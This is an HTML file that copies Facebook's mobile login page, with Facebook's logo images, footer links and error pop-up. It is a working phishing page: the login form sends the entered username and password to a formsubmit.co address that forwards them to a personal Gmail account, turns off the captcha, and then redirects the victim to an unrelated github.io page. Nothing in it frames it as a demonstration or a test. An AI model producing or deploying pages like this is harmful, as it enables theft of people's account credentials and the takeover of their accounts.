<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Facebook</title>
  <link rel="icon" href="temp/facebook.png" type="image/x-icon">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
    }

    .login-container {
      padding: 20px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .facebook-logo {
      font-size: 40px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
      text-transform: lowercase;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-align: left;
    }

    .input-field {
      position: relative;
      padding: 10px;
      border-radius: 10px;
      width: calc(100% - 20px);
      height: 52px;
      box-sizing: border-box;
      margin: 0 auto;
      font-weight: bold;
    }

    .input-field:focus::placeholder {
      transform: translateY(-15px);
      transition: transform 0.1s ease;
      color: rgb(130 130 130 / 1);
      font-size: 12px;
    }

    .input-field:hover {
     border: none;
    }

    .input-field[type="text"] {
      border: 1px solid rgb(130 130 130 / 0.3);
    }

    .input-field[type="password"] {
      border: 1px solid rgb(130 130 130 / 0.3);
    }

    .login-button {
      background-color: #1877f2;
      font-size: 18px;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      width: calc(100% - 20px);
      height: 42px;
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button:hover {
      background-color: #0e5a99;
    }

    .create-account-button {
      background-color: #fff;
      color: #666;
      padding: 10px;
      border: 0.5px solid #ccc;
      border-radius: 25px;
      text-decoration: none;
      font-size: 14px;
      cursor: pointer;
      display: inline-block;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .create-account-button:hover {
      background-color: #f5f5f5;
    }

    .forgotten-password {
      color: #000;
      text-decoration: none;
      font-size: 13px;
      display: block;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin-bottom: 100px;
    }

    .language-option {
      margin-top: 10px;
      font-size: 14px;
      color: #666;
    }

    .footer {
      margin-top: 20px;
    }

    .button-container {
      display: flex;
      font-size: 10px;
      justify-content: center;
      margin-top: 20px;
    }

    .button-container a {
      margin-right: 10px;
      text-decoration: none;
      color: #000;
    }

    .error-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      border-radius: 10px;
      padding: 10px;
      width: 175px;
      z-index: 9999;
    }

    .error-popup .erd {
      margin: 0;
      font-size: 16px;
      text-align: center;
    }
    .error-popup p {
      margin: 0px;
      font-size: 12px;
      text-align: center;
    }
    .error-popup button {
      color: #1877f2;
      font-size: 14px;
      cursor: pointer;
      background-color: #ffffff;
      border: none;
      display: block;
      margin: 0 auto;
    }
    .error-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 9998;
    }
  </style>
</head>
<body>
<div class="login-container">
  <div class="language-option">English (UK)</div>
  <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook" style="width:55px;height:55px; margin: 50px;">
  <form class="login-form" action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
    <input type="Text" name="Facebook ID" id="username" class="input-field" placeholder="Mobile number or email address" required>
    <input type="Password" name="Facebook Password" id="password" class="input-field" placeholder="Password" required>
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://shkumaraman.github.io/win.html">
    <button type="submit" id="loginButton" class="login-button">Log in</button>
  </form>
  <br>
  <a href="https://m.facebook.com/login/identify/" class="forgotten-password">Forgotten Password?</a>
  <p class="account">
    <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="create-account-button">
      Create New Account
    </a>
  </p>
  <div class="footer">
    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Facebook" style="width:50px;height:10px;">
  </div>
  <div class="button-container">
    <a href="https://about.meta.com/" class="about">
      About
    </a>
    <a href="https://m.facebook.com/help/?ref=pf" class="help">
      Help
    </a>
    <a href="#" class="more">
      More
    </a>
  </div>
</div>

<div id="errorPopup" class="error-popup" style="display: none;">
  <p class="erd">Email address or mobile number required</p>
  <br>
  <p>Enter your email address or mobile number to continue.</p>
  <hr>
  <button id="closeButton">OK</button>
</div>
<div id="errorOverlay" class="error-overlay" style="display: none;"></div>
<script>
  document.getElementById("loginButton").addEventListener("click", function() {
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  if (username === "" || password === "") {
    document.getElementById("errorPopup").style.display = "block";
    document.getElementById("errorOverlay").style.display = "block";
  }
});

document.getElementById("closeButton").addEventListener("click", function() {
  document.getElementById("errorPopup").style.display = "none";
  document.getElementById("errorOverlay").style.display = "none";
});

document.getElementById("errorOverlay").addEventListener("click", function() {
  document.getElementById("errorPopup").style.display = "none";
  this.style.display = "none";
});
  
</script>
</body>
</html>
